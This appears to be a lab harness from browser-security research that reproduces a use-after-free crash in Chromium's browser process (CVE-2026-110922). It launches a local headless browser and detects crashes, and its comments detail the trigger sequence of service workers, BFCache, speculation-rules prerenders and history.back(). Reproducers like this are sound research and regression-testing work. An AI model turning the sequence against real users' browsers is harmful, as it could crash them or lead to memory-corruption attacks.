#!/usr/bin/env node
/**
 * CDP-free reproducer for CVE-2026-110922 (crbug.com/568719351).
 *
 * The Playwright-based harness (repro-110922.mjs) cannot reach the vulnerable
 * preconditions: any DevTools/CDP session without "tab target support" makes
 * `devtools_instrumentation::IsPrerenderAllowed()` return false, and Chromium
 * rejects every prerender with `kPrerenderingDisabledByDevTools` (final status
 * 69). Measured on Chromium 155.0.8059.39.
 *
 * This harness launches Chromium directly with no debugging port. The page
 * drives the whole sequence itself and reports milestones back to the local
 * server over fetch(), so no DevTools is ever attached. Crash detection is the
 * browser process dying (browser-process UAF), plus the page's pageshow report.
 *
 * Sequence (mirrors PrerenderBackForwardCacheBrowserTest.
 * EvictBackForwardCacheDuringPrerenderActivationCheck):
 *   1. /empty.html registers service worker v1 and becomes controlled.
 *   2. Navigate to /empty.html?next&drive=1 so step 1 is a BFCache candidate.
 *   3. Inject one speculationrules script: prerender /empty.html?prerender=1
 *      with a No-Vary-Search hint, plus /empty.html?prerender2 queued behind it.
 *   4. The server stalls the prerender-1 response so it stays the running host.
 *   5. Update the service worker, ask it to skipWaiting, then history.back().
 *   6. If the back navigation matches prerender 1, cancelling it starts
 *      prerender 2 synchronously; its navigation start evicts the BFCached
 *      page and destroys the in-flight BFCache restore NavigationRequest.
 *
 * Usage:
 *   node harness/selfdrive-110922.mjs --browser /usr/lib/chromium/chromium
 *   node harness/selfdrive-110922.mjs --browser ... --attempts 5 --delay 0
 *   node harness/selfdrive-110922.mjs --browser ... --count 6 --hint0
 *
 * Exit code: 42 if the browser process crashed, 0 otherwise.
 */
import { spawn } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startScenarioServer } from "./lib/scenario-server.mjs";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function parseArgs(argv) {
  const out = {
    browser: null,
    attempts: 3,
    delay: 0,
    count: 2,
    hint: true,
    timeoutMs: 25000,
    headed: false,
  };
  for (let i = 2; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--browser") out.browser = argv[++i];
    else if (a === "--attempts") out.attempts = Number(argv[++i]);
    else if (a === "--delay") out.delay = Number(argv[++i]);
    else if (a === "--count") out.count = Number(argv[++i]);
    else if (a === "--hint0") out.hint = false;
    else if (a === "--timeout") out.timeoutMs = Number(argv[++i]);
    else if (a === "--headed") out.headed = true;
  }
  return out;
}

const opts = parseArgs(process.argv);
if (!opts.browser) {
  console.error("usage: selfdrive-110922.mjs --browser <path> [--attempts n] [--delay ms] [--count n] [--hint0]");
  process.exit(2);
}

function launchArgs({ url, profile, headed }) {
  return [
    ...(headed ? [] : ["--headless=new"]),
    "--no-sandbox",
    "--disable-gpu",
    "--no-first-run",
    "--no-default-browser-check",
    "--disable-background-networking",
    "--disable-sync",
    "--metrics-recording-only",
    // Keep Prerender2ReuseHost at its production default: the lab must model
    // the shipped configuration, not a tuned one.
    "--disable-features=Translate,MediaRouter",
    `--user-data-dir=${profile}`,
    url,
  ];
}

async function attempt(n) {
  const { server, state, base } = await startScenarioServer();
  const profile = mkdtempSync(join(tmpdir(), "cve-110922-"));
  const url = `${base}/empty.html?drive=1&delay=${opts.delay}&count=${opts.count}` +
    `${opts.hint ? "" : "&hint=0"}`;

  const child = spawn(opts.browser, launchArgs({ url, profile, headed: opts.headed }), {
    stdio: ["ignore", "ignore", "pipe"],
  });
  let stderr = "";
  child.stderr.on("data", (d) => {
    stderr += d.toString();
    if (stderr.length > 200000) stderr = stderr.slice(-200000);
  });

  let exit = null;
  child.on("exit", (code, signal) => (exit = { code, signal }));

  const deadline = Date.now() + opts.timeoutMs;
  let sawPageshow = false;
  let killed = false;

  while (Date.now() < deadline) {
    if (exit) break;
    // The first pageshow fires on the initial load; the outcome we care about
    // is any pageshow reported after history.back() was issued.
    const backIdx = state.reports.findIndex((r) => r.q.outcome === "backing");
    if (backIdx >= 0 && state.reports.slice(backIdx).some((r) => r.q.outcome === "pageshow")) {
      sawPageshow = true;
      await sleep(500); // let the rest of the sequence settle
      break;
    }
    await sleep(50);
  }

  if (!exit) {
    killed = true;
    child.kill("SIGKILL");
    const end = Date.now() + 3000;
    while (!exit && Date.now() < end) await sleep(50);
  }

  const back = state.reports.find((r) => r.q.outcome === "backing");
  const backAt = back?.at ?? null;
  const crashSignals = new Set(["SIGSEGV", "SIGABRT", "SIGILL", "SIGBUS", "SIGTRAP"]);
  const crashed =
    !killed && exit != null && (crashSignals.has(exit.signal) || [134, 139].includes(exit.code));

  const timeline = state.requests.map((r) => ({
    deltaMs: backAt == null ? null : r.at - backAt,
    search: r.search,
    purpose: r.purpose,
  }));
  const startedAtBack = timeline.some(
    (r) => /prerender\d/.test(r.search) && r.deltaMs != null && r.deltaMs > -50 && r.deltaMs < 500,
  );

  const result = {
    attempt: n + 1,
    crashed,
    killed,
    exit,
    sawPageshow,
    prerenderStalled: state.stall > 0,
    sw2Activated: state.sw2ActivatedAt != null,
    startedAtBack,
    reports: state.reports.map((r) => ({ at: backAt == null ? null : r.at - backAt, ...r.q })),
    phase: state.reports
      .map((r) => r.q.outcome + (r.q.outcome === "pageshow" ? `(persisted=${r.q.persisted})` : ""))
      .join(" -> "),
    timeline,
  };

  server.close();
  try {
    rmSync(profile, { recursive: true, force: true });
  } catch {}

  if (!crashed && exit && !killed) {
    const interesting = stderr.split("\n").filter((l) => /Check failed|FATAL|Received signal|ERROR:/.test(l));
    result.stderrTail = interesting.slice(-6);
  }
  return result;
}

console.log(`[i] browser     ${opts.browser}`);
console.log(`[i] delay=${opts.delay}ms count=${opts.count} hint=${opts.hint}`);

let crashed = false;
for (let i = 0; i < opts.attempts && !crashed; i++) {
  const r = await attempt(i);
  crashed = crashed || r.crashed;
  console.log(
    `[#${r.attempt}] crash=${r.crashed} pageshow=${r.sawPageshow} ` +
      `stall=${r.prerenderStalled} sw2=${r.sw2Activated} startedAtBack=${r.startedAtBack} ` +
      `exit=${r.exit ? `${r.exit.code ?? r.exit.signal}` : "running"}${r.killed ? " (killed)" : ""}`,
  );
  console.log(`    reports: ${r.phase}`);
  for (const e of r.timeline) {
    console.log(`    req ${e.deltaMs >= 0 ? "+" : ""}${e.deltaMs}ms ${e.search} purpose=${e.purpose || "-"}`);
  }
  if (r.stderrTail?.length) console.log(`    stderr: ${r.stderrTail.join(" | ").slice(0, 400)}`);
}

console.log(`\nattempts=${opts.attempts} crashed=${crashed ? 1 : 0}`);
process.exit(crashed ? 42 : 0);
